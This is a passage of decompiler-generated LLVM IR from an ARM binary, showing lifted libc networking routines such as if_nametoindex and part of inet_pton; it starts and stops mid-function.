  %v3_13c20 = zext i8 %v2_13c20 to i32
  store i32 %v3_13c20, i32* @r3, align 4
  %v2_13c24 = icmp eq i8 %v2_13c20, 0
  br i1 %v2_13c24, label %dec_label_pc_13c2c, label %dec_label_pc_13c40

dec_label_pc_13c2c:                               ; preds = %dec_label_pc_13c20
  %v0_13c2c = load i32, i32* %r5.global-to-local, align 4
  %v2_13c2c = icmp eq i32 %v0_13c2c, 0
  %v0_13c30 = load i32, i32* %r0.global-to-local, align 4
  %v1_13c30 = load i32, i32* %r6.global-to-local, align 4
  %v2_13c30 = sub i32 %v1_13c30, %v0_13c30
  store i32 %v2_13c30, i32* %r0.global-to-local, align 4
  br i1 %v2_13c2c, label %dec_label_pc_13c58, label %bb69

bb69:                                             ; preds = %dec_label_pc_13c2c
  %v2_13c34 = load i32, i32* %r7.global-to-local, align 4
  %v3_13c34 = inttoptr i32 %v2_13c34 to i32*
  store i32 %v3_13c20, i32* %v3_13c34, align 4
  %v1_13c38 = load i32, i32* @r3, align 4
  %v2_13c38 = load i32, i32* %r5.global-to-local, align 4
  %v3_13c38 = inttoptr i32 %v2_13c38 to i32*
  store i32 %v1_13c38, i32* %v3_13c38, align 4
  br label %dec_label_pc_13c58

dec_label_pc_13c40:                               ; preds = %dec_label_pc_13c18, %dec_label_pc_13c20
  %v0_13c40 = call i32 @__errno_location()
  store i32 %v0_13c40, i32* %r0.global-to-local, align 4
  %v0_13c44 = load i32, i32* %r5.global-to-local, align 4
  %v2_13c44 = icmp eq i32 %v0_13c44, 0
  store i32 84, i32* @r3, align 4
  br i1 %v2_13c44, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_13c40
  %v1_13c4c = load i32, i32* %r4.global-to-local, align 4
  %v2_13c4c = load i32, i32* %r7.global-to-local, align 4
  %v3_13c4c = inttoptr i32 %v2_13c4c to i32*
  store i32 %v1_13c4c, i32* %v3_13c4c, align 4
  %v0_13c50.pre = load i32, i32* @r3, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_13c40, %bb70
  %v0_13c50 = phi i32 [ 84, %dec_label_pc_13c40 ], [ %v0_13c50.pre, %bb70 ]
  %v2_13c50 = inttoptr i32 %v0_13c40 to i32*
  store i32 %v0_13c50, i32* %v2_13c50, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13c58

dec_label_pc_13c58:                               ; preds = %dec_label_pc_13c2c, %bb69, %dec_label_pc_13adc, %dec_label_pc_139e8, %dec_label_pc_139a4, %bb71
  store i32 %v15_13938, i32* %lr.global-to-local, align 4
  %v1_13c60 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_13c60

; uselistorder directives
  uselistorder i32 %v0_13c0c28, { 1, 0 }
  uselistorder i1 %v2_13bf4, { 1, 0 }
  uselistorder i32 %v5_13be0, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_13bcc, { 1, 0, 2 }
  uselistorder i32 %v5_13bbc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_13bc0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v1_13bbc, { 0, 2, 1 }
  uselistorder i32 %v1_13b7c, { 1, 0, 2 }
  uselistorder i32 %v0_13b5c, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_13b48, { 0, 1, 4, 3, 5, 2 }
  uselistorder i32 %v0_13ae8, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %storemerge60, { 1, 0, 2 }
  uselistorder i32 %v1_13ab0, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_13a94, { 2, 0, 1, 3 }
  uselistorder i32 %v0_13aac, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %v1_13a5c, { 1, 0, 2 }
  uselistorder i32 %v0_13acc88, { 1, 0 }
  uselistorder i32 %v1_13a28, { 0, 2, 1 }
  uselistorder i32 %v1_13a24, { 0, 2, 3, 1 }
  uselistorder i32 %storemerge, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_13a18, { 4, 5, 1, 2, 3, 0, 6 }
  uselistorder i32 %v2_139d0, { 1, 0 }
  uselistorder i32 %v0_139d8, { 1, 0 }
  uselistorder i32 %v0_139a4, { 1, 0 }
  uselistorder i32 %v0_13994, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1393c, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32* %r5.global-to-local, { 3, 4, 5, 0, 6, 7, 1, 8, 2, 9, 10 }
  uselistorder i32* %r4.global-to-local, { 17, 1, 0, 2, 3, 4, 6, 5, 7, 18, 8, 20, 19, 9, 10, 11, 12, 13, 15, 14, 21, 22, 16, 23 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 8, 7, 4, 5, 6, 9, 10, 11, 12, 13, 0, 14, 15, 16 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 0, 13, 14, 15, 16 }
  uselistorder i32* %r0.global-to-local, { 12, 0, 9, 1, 17, 18, 2, 19, 3, 20, 5, 4, 6, 8, 7, 13, 11, 10, 15, 16, 14 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 63, { 9, 8, 7, 6, 10, 0, 5, 11, 4, 1, 14, 2, 12, 3, 13 }
  uselistorder i32 62, { 1, 2, 0 }
  uselistorder i8 -64, { 0, 1, 3, 4, 2 }
  uselistorder i32 67108864, { 2, 0, 1, 3 }
  uselistorder i8 8, { 1, 0 }
  uselistorder i32 50, { 1, 0, 3, 4, 6, 2, 5 }
  uselistorder i32 127, { 1, 0, 5, 3, 2, 4 }
  uselistorder i32 -2139062144, { 6, 13, 12, 2, 8, 9, 7, 3, 0, 1, 10, 11, 4, 5 }
  uselistorder i32 -16843009, { 1, 4, 3, 0, 5, 6, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 126, { 1, 0 }
  uselistorder i32 (i8*)* @strlen, { 14, 30, 13, 0, 29, 6, 5, 4, 3, 2, 28, 27, 26, 25, 12, 11, 10, 9, 8, 7, 24, 23, 22, 21, 20, 19, 18, 17, 15, 16, 1 }
  uselistorder i32 57343, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13c58, { 5, 1, 0, 2, 3, 4 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_13c40, { 1, 0 }
  uselistorder label %dec_label_pc_13c20, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13c10, { 1, 0 }
  uselistorder label %dec_label_pc_13c04, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_13bd8, { 1, 0 }
  uselistorder label %dec_label_pc_13bb0, { 1, 0 }
  uselistorder label %dec_label_pc_13b94, { 1, 0 }
  uselistorder label %dec_label_pc_13b30, { 1, 0 }
  uselistorder label %dec_label_pc_13adc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13ad4, { 1, 0 }
  uselistorder label %dec_label_pc_13acc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13a74, { 1, 0 }
  uselistorder label %dec_label_pc_13a24, { 1, 0 }
  uselistorder label %dec_label_pc_139c0, { 1, 0 }
}

define i32 @function_13c6c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13c6c:
  %v0_13c6c = load i1, i1* @cpsr_c, align 1
  %v1_13c6c = load i1, i1* @cpsr_z, align 1
  %v2_13c6c = xor i1 %v1_13c6c, true
  %v3_13c6c = and i1 %v0_13c6c, %v2_13c6c
  br i1 %v3_13c6c, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_13c6c
  br i1 %v1_13c6c, label %bb3, label %bb4

bb2:                                              ; preds = %dec_label_pc_13c6c
  br i1 %v1_13c6c, label %._crit_edge, label %bb4

._crit_edge:                                      ; preds = %bb2
  br label %bb3

bb3:                                              ; preds = %._crit_edge, %bb
  br label %bb4

bb4:                                              ; preds = %bb, %bb2, %bb3
  ret i32 %arg1

; uselistorder directives
  uselistorder i1 %v1_13c6c, { 2, 1, 0 }
  uselistorder label %bb4, { 2, 1, 0 }
}

define i32 @if_nametoindex(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-48 = alloca i32, align 4
  %v2_13c7c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %arg1, i32* @r5, align 4
  %v3_13c8c = call i32 @socket(i32 1, i32 524290, i32 0)
  store i32 %v3_13c8c, i32* @r7, align 4
  %v1_13c90 = icmp slt i32 %v3_13c8c, 0
  br i1 %v1_13c90, label %.thread, label %dec_label_pc_13c9c

.thread:                                          ; preds = %entry
  br label %bb12

dec_label_pc_13c9c:                               ; preds = %entry
  %v0_13c9c = load i32, i32* @r5, align 4
  store i32 %v0_13c9c, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v3_13ca8 = call i32 @strncpy(i32 %v2_13c7c, i32 %v0_13c9c, i32 16)
  %v0_13cac = load i32, i32* @r7, align 4
  store i32 %v0_13cac, i32* @r0, align 4
  %v3_13cb8 = call i32 @ioctl(i32 %v0_13cac, i32 35123, i32 %v2_13c7c)
  %v1_13cd0 = icmp slt i32 %v3_13cb8, 0
  br i1 %v1_13cd0, label %bb11, label %bb

bb:                                               ; preds = %dec_label_pc_13c9c
  br label %bb12

bb11:                                             ; preds = %dec_label_pc_13c9c
  br label %bb12

bb12:                                             ; preds = %bb, %.thread, %bb11
  %v1_13ce4 = phi i32 [ %tmp, %bb ], [ 0, %bb11 ], [ -1, %.thread ]
  ret i32 %v1_13ce4

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @ioctl, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @socket, { 4, 3, 2, 1, 0, 7, 6, 5 }
  uselistorder label %bb12, { 2, 0, 1 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13ce8:
  %v0_13ce8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13ce8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13ce8
  %v1_13ce8 = load i32, i32* @r8, align 4
  %v3_13ce8 = and i32 %v1_13ce8, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13ce8, %bb
  %.01 = phi i32 [ %v3_13ce8, %bb ], [ undef, %dec_label_pc_13ce8 ]
  ret i32 %.01

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @inet_pton(i16 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = inttoptr i32 %arg2 to i8*
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp56 = sext i16 %arg1 to i32
  store i32 %tmp56, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13cf0 = load i32, i32* @r4, align 4
  store i32 %v3_13cf0, i32* %stack_var_-24, align 4
  %v6_13cf0 = load i32, i32* @r5, align 4
  %v9_13cf0 = load i32, i32* @r6, align 4
  %v12_13cf0 = load i32, i32* @r7, align 4
  %v15_13cf0 = load i32, i32* @r8, align 4
  %v18_13cf0 = load i32, i32* @lr, align 4
  %v19_13cf0 = ptrtoint i32* %stack_var_-24 to i32
  %v0_13cf4 = load i32, i32* %r0.global-to-local, align 4
  %v7_13cf4 = icmp eq i32 %v0_13cf4, 2
  store i1 %v7_13cf4, i1* %cpsr_z.global-to-local, align 1
  %v2_13cf8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r8, align 4
  br i1 %v7_13cf4, label %dec_label_pc_13f80, label %dec_label_pc_13d84

dec_label_pc_13d0c:                               ; preds = %dec_label_pc_13d1c
  %v1_13d0c = add i32 %v0_13d34, 1
  store i32 %v1_13d0c, i32* %r2.global-to-local, align 4
  %v7_13d10 = icmp eq i32 %v1_13d0c, 3
  store i1 %v7_13d10, i1* %cpsr_z.global-to-local, align 1
  %v0_13d14 = load i32, i32* %lr.global-to-local, align 4
  %v3_13d14 = mul i32 %v0_13d14, %v1_13d14
  %v4_13d14 = add i32 %v3_13d14, %v1_13d20
  store i32 %v4_13d14, i32* %r1.global-to-local, align 4
  br i1 %v7_13d10, label %dec_label_pc_13d3c, label %dec_label_pc_13d1c

dec_label_pc_13d1c:                               ; preds = %dec_label_pc_13d0c, %dec_label_pc_13f8c
  %v1_13d14 = phi i32 [ %v4_13d14, %dec_label_pc_13d0c ], [ %v0_13f8c, %dec_label_pc_13f8c ]
  %v0_13d34 = phi i32 [ %v1_13d0c, %dec_label_pc_13d0c ], [ %v0_13f8c, %dec_label_pc_13f8c ]
  %v2_13d1c = add i32 %v0_13d34, %v0_13d3c
  %v3_13d1c = inttoptr i32 %v2_13d1c to i8*
  %v4_13d1c = load i8, i8* %v3_13d1c, align 1
  %v6_13d1c = zext i8 %v4_13d1c to i32
  %v1_13d20 = add nsw i32 %v6_13d1c, -48
  store i32 %v1_13d20, i32* @r3, align 4
  %v7_13d24 = icmp eq i32 %v1_13d20, 9
  store i1 %v7_13d24, i1* %cpsr_z.global-to-local, align 1
  %tmp91 = icmp ult i32 %v1_13d20, 10
  br i1 %tmp91, label %dec_label_pc_13d0c, label %dec_label_pc_13d2c

dec_label_pc_13d2c:                               ; preds = %dec_label_pc_13d1c
  %v2_13d2c = icmp eq i32 %v0_13d34, 0
  store i1 %v2_13d2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13d2c, label %dec_label_pc_13f70, label %dec_label_pc_13d34

dec_label_pc_13d34:                               ; preds = %dec_label_pc_13d2c
  %v7_13d34 = icmp eq i32 %v0_13d34, 1
  store i1 %v7_13d34, i1* %cpsr_z.global-to-local, align 1
  %v7_13d38 = icmp slt i32 %v0_13d34, 2
  br i1 %v7_13d38, label %dec_label_pc_13d48, label %dec_label_pc_13d3c

dec_label_pc_13d3c:                               ; preds = %dec_label_pc_13d0c, %dec_label_pc_13d34
  %v0_13d4846 = phi i32 [ %v1_13d14, %dec_label_pc_13d34 ], [ %v4_13d14, %dec_label_pc_13d0c ]
  %v1_13d3c = inttoptr i32 %v0_13d3c to i8*
  %v2_13d3c = load i8, i8* %v1_13d3c, align 1
  %v3_13d3c = zext i8 %v2_13d3c to i32
  store i32 %v3_13d3c, i32* @r3, align 4
  %v7_13d40 = icmp eq i8 %v2_13d3c, 48
  store i1 %v7_13d40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13d40, label %dec_label_pc_13f70, label %dec_label_pc_13d48

dec_label_pc_13d48:                               ; preds = %dec_label_pc_13d3c, %dec_label_pc_13d34
  %v0_13d50 = phi i32 [ %v0_13d4846, %dec_label_pc_13d3c ], [ %v1_13d14, %dec_label_pc_13d34 ]
  %v7_13d48 = icmp eq i32 %v0_13d50, 255
  store i1 %v7_13d48, i1* %cpsr_z.global-to-local, align 1
  %v8_13d4c = icmp sgt i32 %v0_13d50, 255
  br i1 %v8_13d4c, label %dec_label_pc_13f70, label %dec_label_pc_13d50

dec_label_pc_13d50:                               ; preds = %dec_label_pc_13d48
  %v1_13d50 = trunc i32 %v0_13d50 to i8
  %v3_13d50 = load i32, i32* @r8, align 4
  %v4_13d50 = add i32 %v3_13d50, %v2_13d50
  %v5_13d50 = inttoptr i32 %v4_13d50 to i8*
  store i8 %v1_13d50, i8* %v5_13d50, align 1
  %v0_13d54 = load i32, i32* @r5, align 4
  %v1_13d54 = load i32, i32* %r2.global-to-local, align 4
  %v2_13d54 = add i32 %v1_13d54, %v0_13d54
  %v3_13d54 = inttoptr i32 %v2_13d54 to i8*
  %v4_13d54 = load i8, i8* %v3_13d54, align 1
  %v6_13d54 = zext i8 %v4_13d54 to i32
  store i32 %v6_13d54, i32* @r3, align 4
  %v2_13d58 = icmp eq i8 %v4_13d54, 0
  store i1 %v2_13d58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13d58, label %bb, label %dec_label_pc_13d64

bb:                                               ; preds = %dec_label_pc_13d50
  %v1_13d5c = load i32, i32* %r0.global-to-local, align 4
  %v8_13d5c = icmp eq i32 %v1_13d5c, 3
  store i1 %v8_13d5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_13d5c, label %dec_label_pc_13f78, label %dec_label_pc_13d64

dec_label_pc_13d64:                               ; preds = %dec_label_pc_13d50, %bb
  %v7_13d64 = icmp eq i8 %v4_13d54, 46
  store i1 %v7_13d64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13d64, label %dec_label_pc_13d6c, label %dec_label_pc_13f70

dec_label_pc_13d6c:                               ; preds = %dec_label_pc_13d64
  %v0_13d6c = load i32, i32* %r0.global-to-local, align 4
  %v1_13d6c = add i32 %v0_13d6c, 1
  store i32 %v1_13d6c, i32* %r0.global-to-local, align 4
  %v7_13d70 = icmp eq i32 %v1_13d6c, 4
  store i1 %v7_13d70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13d70, label %dec_label_pc_13f70, label %dec_label_pc_13d78

dec_label_pc_13d78:                               ; preds = %dec_label_pc_13d6c
  %v1_13d78 = add i32 %v0_13d54, 1
  %v2_13d7c = add i32 %v1_13d54, %v1_13d78
  store i32 %v2_13d7c, i32* @r5, align 4
  %v0_13f8c.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_13f8c

dec_label_pc_13d84:                               ; preds = %entry
  %v7_13d84 = icmp eq i32 %v0_13cf4, 10
  store i1 %v7_13d84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13d84, label %dec_label_pc_13da0, label %dec_label_pc_13d8c

dec_label_pc_13d8c:                               ; preds = %dec_label_pc_13d84
  %v0_13d8c = call i32 @__errno_location()
  store i32 %v0_13d8c, i32* %r0.global-to-local, align 4
  store i32 97, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_13d98 = inttoptr i32 %v0_13d8c to i32*
  store i32 97, i32* %v2_13d98, align 4
  %v0_13f98.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13f98

dec_label_pc_13da0:                               ; preds = %dec_label_pc_13d84
  %v3_13da0 = load i8, i8* %tmp, align 1
  %v7_13da4 = icmp eq i8 %v3_13da0, 58
  store i1 %v7_13da4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13da4, label %dec_label_pc_13dac, label %dec_label_pc_13db8

dec_label_pc_13dac:                               ; preds = %dec_label_pc_13da0
  %v1_13dac = add i32 %arg2, 1
  %v2_13dac = inttoptr i32 %v1_13dac to i8*
  %v3_13dac = load i8, i8* %v2_13dac, align 1
  %v4_13dac = zext i8 %v3_13dac to i32
  store i32 %v4_13dac, i32* @r3, align 4
  store i32 %v1_13dac, i32* @r5, align 4
  %v7_13db0 = icmp eq i8 %v3_13dac, 58
  store i1 %v7_13db0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13db0, label %dec_label_pc_13db8, label %dec_label_pc_13f70

dec_label_pc_13db8:                               ; preds = %dec_label_pc_13dac, %dec_label_pc_13da0
  %v0_13dc019 = phi i32 [ %v1_13dac, %dec_label_pc_13dac ], [ %arg2, %dec_label_pc_13da0 ]
  store i32 0, i32* @r6, align 4
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_13dc0

dec_label_pc_13dc0:                               ; preds = %dec_label_pc_13ec0, %dec_label_pc_13db8
  %v0_13e54 = phi i32 [ %v1_13ec0, %dec_label_pc_13ec0 ], [ 0, %dec_label_pc_13db8 ]
  %v0_13dc4 = phi i32 [ %v0_13dc4.pre, %dec_label_pc_13ec0 ], [ -1, %dec_label_pc_13db8 ]
  %v0_13dc0 = phi i32 [ %v0_13dc020, %dec_label_pc_13ec0 ], [ %v0_13dc019, %dec_label_pc_13db8 ]
  %v1_13dc0 = inttoptr i32 %v0_13dc0 to i8*
  %v2_13dc0 = load i8, i8* %v1_13dc0, align 1
  %tmp92 = icmp slt i32 %v0_13dc4, 0
  %v3_13dc4 = zext i1 %tmp92 to i32
  store i32 %v3_13dc4, i32* @r4, align 4
  %v7_13dc8 = icmp eq i8 %v2_13dc0, 58
  store i1 %v7_13dc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13dc8, label %.thread1, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13dc0
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread5.thread12

.thread1:                                         ; preds = %dec_label_pc_13dc0
  %v2_13dd4 = icmp eq i1 %tmp92, false
  store i1 %v2_13dd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13dd4, label %.thread5.thread12, label %dec_label_pc_13de4

.thread5.thread12:                                ; preds = %.thread2, %.thread1
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_13e24

dec_label_pc_13de4:                               ; preds = %.thread1
  %v1_13de8 = urem i32 %v0_13e54, 8
  %v3_13dec = mul nuw nsw i32 %v1_13de8, 2
  %v4_13dec = add i32 %v3_13dec, %v19_13cf0
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_13df4 = add i32 %v4_13dec, -16
  %v4_13df4 = inttoptr i32 %v3_13df4 to i16*
  store i16 0, i16* %v4_13df4, align 2
  %v0_13df8 = load i32, i32* @r5, align 4
  %v1_13df8 = add i32 %v0_13df8, 1
  %v2_13df8 = inttoptr i32 %v1_13df8 to i8*
  %v3_13df8 = load i8, i8* %v2_13df8, align 1
  %v4_13df8 = zext i8 %v3_13df8 to i32
  store i32 %v4_13df8, i32* @r3, align 4
  store i32 %v1_13df8, i32* @r5, align 4
  %v2_13dfc = icmp eq i8 %v3_13df8, 0
  store i1 %v2_13dfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13dfc, label %dec_label_pc_13ec8, label %dec_label_pc_13e04

dec_label_pc_13e04:                               ; preds = %dec_label_pc_13de4
  %v0_13e04 = load i32, i32* @r6, align 4
  %v7_13e04 = icmp eq i32 %v0_13e04, 7
  store i1 %v7_13e04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13e04, label %dec_label_pc_13f70, label %dec_label_pc_13e0c

dec_label_pc_13e0c:                               ; preds = %dec_label_pc_13e04
  store i32 %v0_13e04, i32* @ip, align 4
  br label %dec_label_pc_13ec0

dec_label_pc_13e14:                               ; preds = %dec_label_pc_13e44, %dec_label_pc_13e24
  %v0_13e1c = phi i32 [ %v1_13e44, %dec_label_pc_13e44 ], [ %v1_13e2c, %dec_label_pc_13e24 ]
  %v1_13e14 = add nuw nsw i32 %v0_13e14, 1
  store i32 %v1_13e14, i32* %r0.global-to-local, align 4
  %v7_13e18 = icmp eq i32 %v1_13e14, 4
  store i1 %v7_13e18, i1* %cpsr_z.global-to-local, align 1
  %v4_13e1c = mul i32 %v1_13e1c, 16
  %v5_13e1c = add i32 %v0_13e1c, %v4_13e1c
  store i32 %v5_13e1c, i32* @lr, align 4
  br i1 %v7_13e18, label %dec_label_pc_13e54.loopexit, label %dec_label_pc_13e24

dec_label_pc_13e24:                               ; preds = %.thread5.thread12, %dec_label_pc_13e14
  %v1_13e1c = phi i32 [ 0, %.thread5.thread12 ], [ %v5_13e1c, %dec_label_pc_13e14 ]
  %v0_13e14 = phi i32 [ 0, %.thread5.thread12 ], [ %v1_13e14, %dec_label_pc_13e14 ]
  %v2_13e24 = add i32 %v0_13e14, %v0_13dc0
  %v3_13e24 = inttoptr i32 %v2_13e24 to i8*
  %v4_13e24 = load i8, i8* %v3_13e24, align 1
  %v6_13e24 = zext i8 %v4_13e24 to i32
  %v1_13e28 = or i32 %v6_13e24, 32
  store i32 %v1_13e28, i32* %r2.global-to-local, align 4
  %v1_13e2c = add nsw i32 %v6_13e24, -48
  store i32 %v1_13e2c, i32* @r3, align 4
  %v7_13e30 = icmp eq i32 %v1_13e2c, 9
  store i1 %v7_13e30, i1* %cpsr_z.global-to-local, align 1
  %v1_13e34 = add nsw i32 %v1_13e28, -97
  store i32 %v1_13e34, i32* %r1.global-to-local, align 4
  %tmp93 = icmp ult i32 %v1_13e2c, 10
  br i1 %tmp93, label %dec_label_pc_13e14, label %dec_label_pc_13e3c

dec_label_pc_13e3c:                               ; preds = %dec_label_pc_13e24
  %v2_13e3c = icmp ugt i32 %v1_13e34, 4
  %v7_13e3c = icmp eq i32 %v1_13e34, 5
  store i1 %v7_13e3c, i1* %cpsr_z.global-to-local, align 1
  %v2_13e40 = xor i1 %v7_13e3c, true
  %v3_13e40 = and i1 %v2_13e3c, %v2_13e40
  br i1 %v3_13e40, label %dec_label_pc_13e4c, label %dec_label_pc_13e44

dec_label_pc_13e44:                               ; preds = %dec_label_pc_13e3c
  %v1_13e44 = add nsw i32 %v1_13e28, -87
  store i32 %v1_13e44, i32* @r3, align 4
  %v6_13e44 = icmp ult i32 %v1_13e28, 87
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_13e44, label %dec_label_pc_13e4c, label %dec_label_pc_13e14

dec_label_pc_13e4c:                               ; preds = %dec_label_pc_13e44, %dec_label_pc_13e3c
  %v2_13e4c = icmp eq i32 %v0_13e14, 0
  store i1 %v2_13e4c, i1* %cpsr_z.global-to-local, align 1
  %extract.t49 = trunc i32 %v1_13e1c to i16
  br i1 %v2_13e4c, label %dec_label_pc_13f70, label %dec_label_pc_13e54

dec_label_pc_13e54.loopexit:                      ; preds = %dec_label_pc_13e14
  %extract.t = trunc i32 %v5_13e1c to i16
  br label %dec_label_pc_13e54

dec_label_pc_13e54:                               ; preds = %dec_label_pc_13e54.loopexit, %dec_label_pc_13e4c
  %v0_13e60.off0 = phi i16 [ %extract.t, %dec_label_pc_13e54.loopexit ], [ %extract.t49, %dec_label_pc_13e4c ]
  %v1_13e54 = urem i32 %v0_13e54, 8
  store i32 %v19_13cf0, i32* %r2.global-to-local, align 4
  %v3_13e5c = mul nuw nsw i32 %v1_13e54, 2
  %v4_13e5c = add i32 %v3_13e5c, %v19_13cf0
  %v3_13e60 = add i32 %v4_13e5c, -16
  %v4_13e60 = inttoptr i32 %v3_13e60 to i16*
  store i16 %v0_13e60.off0, i16* %v4_13e60, align 2
  %v0_13e64 = load i32, i32* @r5, align 4
  %v1_13e64 = load i32, i32* %r0.global-to-local, align 4
  %v2_13e64 = add i32 %v1_13e64, %v0_13e64
  %v3_13e64 = inttoptr i32 %v2_13e64 to i8*
  %v4_13e64 = load i8, i8* %v3_13e64, align 1
  %v6_13e64 = zext i8 %v4_13e64 to i32
  store i32 %v6_13e64, i32* @r3, align 4
  %v2_13e68 = icmp eq i8 %v4_13e64, 0
  store i1 %v2_13e68, i1* %cpsr_z.global-to-local, align 1
  %v0_13e70 = load i32, i32* @r6, align 4
  br i1 %v2_13e68, label %dec_label_pc_13e70, label %dec_label_pc_13e80

dec_label_pc_13e70:                               ; preds = %dec_label_pc_13e54
  %v7_13e70 = icmp eq i32 %v0_13e70, 7
  store i1 %v7_13e70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13e70, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_13e70
  %v1_13e74 = load i32, i32* @ip, align 4
  %v2_13e74 = icmp slt i32 %v1_13e74, 0
  %v3_13e74 = icmp eq i32 %v1_13e74, 0
  store i1 %v3_13e74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13e74, label %dec_label_pc_13e80, label %dec_label_pc_13ed0thread-pre-split

bb66:                                             ; preds = %dec_label_pc_13e70
  %v1_13e70 = add i32 %v0_13e70, -7
  %v6_13e70 = icmp slt i32 %v1_13e70, 0
  %v3_13e70 = sub i32 6, %v0_13e70
  %v4_13e70 = and i32 %v3_13e70, %v0_13e70
  %v5_13e70 = icmp slt i32 %v4_13e70, 0
  %v2_13e78 = xor i1 %v6_13e70, %v5_13e70
  br i1 %v2_13e78, label %dec_label_pc_13e80, label %dec_label_pc_13ed0thread-pre-split

dec_label_pc_13e80:                               ; preds = %dec_label_pc_13e54, %bb66, %bb65
  %v1_13ea8 = phi i32 [ %v0_13e70, %bb65 ], [ 7, %bb66 ], [ %v0_13e70, %dec_label_pc_13e54 ]
  %v7_13e80 = icmp eq i32 %v1_13ea8, 7
  store i1 %v7_13e80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13e80, label %dec_label_pc_13f70, label %dec_label_pc_13e88

dec_label_pc_13e88:                               ; preds = %dec_label_pc_13e80
  %v7_13e88 = icmp eq i8 %v4_13e64, 58
  store i1 %v7_13e88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13e88, label %dec_label_pc_13eb8, label %dec_label_pc_13e90

dec_label_pc_13e90:                               ; preds = %dec_label_pc_13e88
  %v7_13e90 = icmp eq i8 %v4_13e64, 46
  store i1 %v7_13e90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13e90, label %dec_label_pc_13e98, label %dec_label_pc_13f70

dec_label_pc_13e98:                               ; preds = %dec_label_pc_13e90
  %v7_13e98 = icmp eq i32 %v1_13ea8, 5
  store i1 %v7_13e98, i1* %cpsr_z.global-to-local, align 1
  %v7_13e9c = icmp slt i32 %v1_13ea8, 6
  br i1 %v7_13e9c, label %bb67, label %.thread54

.thread54:                                        ; preds = %dec_label_pc_13e98
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread10

bb67:                                             ; preds = %dec_label_pc_13e98
  %v8_13ea0 = load i32, i32* @r4, align 4
